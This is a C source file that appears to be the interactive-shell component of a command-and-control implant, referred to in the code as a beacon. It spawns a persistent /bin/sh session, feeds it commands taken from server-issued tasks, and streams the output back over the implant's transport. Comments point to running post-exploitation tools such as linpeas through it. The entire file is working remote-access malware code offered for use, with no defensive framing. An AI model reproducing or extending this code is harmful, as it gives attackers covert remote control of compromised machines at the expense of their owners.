// Interactive shell: persistent /bin/sh session across tasks.
// OP_ISHELL payload:
//   empty (0 bytes) -> stop session (if running)
//   non-empty       -> start if not running, write to stdin, drain stdout real-time
//
// ishell_pump() is called from the main loop every iteration to flush output
// from long-running commands (linpeas, etc.) without blocking task dispatch.

#include "../core/beacon.h"
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <poll.h>
#include <sys/wait.h>

static pid_t    g_pid      = -1;
static int      g_stdin    = -1;   // write end -> child stdin
static int      g_stdout   = -1;   // read end  <- child stdout+stderr
static uint64_t g_task_id  = 0;    // task_id for streaming output back

static void ishell_stop(void) {
    if (g_pid > 0) {
        kill(g_pid, SIGTERM);
        waitpid(g_pid, NULL, 0);
        g_pid = -1;
    }
    if (g_stdin  >= 0) { close(g_stdin);  g_stdin  = -1; }
    if (g_stdout >= 0) { close(g_stdout); g_stdout = -1; }
}

static int ishell_alive(void) {
    if (g_pid <= 0) return 0;
    int st;
    pid_t r = waitpid(g_pid, &st, WNOHANG);
    if (r == g_pid || (r < 0 && errno == ECHILD)) {
        close(g_stdin);  g_stdin  = -1;
        close(g_stdout); g_stdout = -1;
        g_pid = -1;
        return 0;
    }
    return 1;
}

static int ishell_start(void) {
    int in_pfd[2], out_pfd[2];
    if (pipe(in_pfd) < 0) return 0;
    if (pipe(out_pfd) < 0) { close(in_pfd[0]); close(in_pfd[1]); return 0; }

    pid_t pid = fork();
    if (pid < 0) {
        close(in_pfd[0]); close(in_pfd[1]);
        close(out_pfd[0]); close(out_pfd[1]);
        return 0;
    }
    if (pid == 0) {
        close(in_pfd[1]); close(out_pfd[0]);
        dup2(in_pfd[0], STDIN_FILENO);
        dup2(out_pfd[1], STDOUT_FILENO);
        dup2(out_pfd[1], STDERR_FILENO);
        close(in_pfd[0]); close(out_pfd[1]);
        setsid();
        execl("/bin/sh", "sh", (char*)NULL);
        _exit(127);
    }

    close(in_pfd[0]); close(out_pfd[1]);
    g_pid    = pid;
    g_stdin  = in_pfd[1];
    g_stdout = out_pfd[0];
    return 1;
}

// Read all available data from the pipe, flush to server.
// first_ms  -- max wait for the FIRST byte of output
// idle_ms   -- after data received, if pipe is silent this long -> return
static void ishell_drain(int first_ms, int idle_ms) {
    struct pollfd pfd = { .fd = g_stdout, .events = POLLIN };
    char buf[8192];
    int timeout = first_ms;

    for (;;) {
        int ret = poll(&pfd, 1, timeout);
        if (ret <= 0) break;
        if (!(pfd.revents & POLLIN)) break;

        int got = 0;
        for (;;) {
            ssize_t n = read(g_stdout, buf, sizeof(buf));
            if (n <= 0) break;
            out_write(buf, (size_t)n);
            got = 1;

            // Flush before the buffer overflows
            if (out_remaining() < sizeof(buf)) {
                out_flush_chunk(get_transport(), 0);
            }

            int r2 = poll(&pfd, 1, 0);
            if (r2 <= 0 || !(pfd.revents & POLLIN)) break;
        }

        if (got) {
            out_flush_chunk(get_transport(), 0);
            timeout = idle_ms;
        }
    }
}

// Called from the main loop EVERY iteration to flush pending output
// from long-running shell commands (linpeas, etc.).
// Returns quickly (non-blocking) if nothing to read.
void ishell_pump(void) {
    if (!ishell_alive()) return;
    if (g_stdout < 0) return;

    struct pollfd pfd = { .fd = g_stdout, .events = POLLIN };
    if (poll(&pfd, 1, 0) <= 0) return;          // nothing available
    if (!(pfd.revents & POLLIN)) return;

    // Data available — start a new output frame with the saved task_id
    out_begin(g_task_id, RESP_OUTPUT);

    char buf[8192];
    for (;;) {
        ssize_t n = read(g_stdout, buf, sizeof(buf));
        if (n <= 0) break;
        out_write(buf, (size_t)n);

        if (out_remaining() < sizeof(buf)) {
            out_flush_chunk(get_transport(), 0);
        }

        // More data right now?
        int r2 = poll(&pfd, 1, 0);
        if (r2 <= 0 || !(pfd.revents & POLLIN)) break;
    }

    // Flush and send what we have (is_last=0 — more may come next cycle)
    out_flush_chunk(get_transport(), 0);
}

void cmd_ishell(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);
    g_task_id = t->id;   // save for ishell_pump()

    // Empty payload = stop session
    if (!t->pay || t->pay_len == 0) {
        ishell_stop();
        out_write("interactive shell closed\n", 24);
        return;
    }

    // Start if not running
    if (!ishell_alive()) {
        if (!ishell_start()) {
            out_write("failed to start /bin/sh\n", 23);
            return;
        }
        ishell_drain(300, 30);
    }

    // Write command + newline to shell stdin
    write(g_stdin, t->pay, t->pay_len);
    write(g_stdin, "\n", 1);

    // Drain initial burst of output
    ishell_drain(5000, 20);
}
